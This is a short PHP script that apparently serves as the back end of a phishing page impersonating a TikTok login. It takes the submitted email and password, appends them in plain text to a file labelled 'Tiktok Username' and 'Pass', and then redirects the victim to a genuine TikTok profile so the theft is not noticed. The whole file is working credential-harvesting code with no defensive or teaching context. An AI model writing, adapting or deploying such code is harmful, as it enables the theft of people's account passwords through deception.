<?php

file_put_contents("usernames.txt", "Tiktok Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.tiktok.com/@quinagfashions?_t=ZM-8vfH473klCp&_r=1');
exit();
?>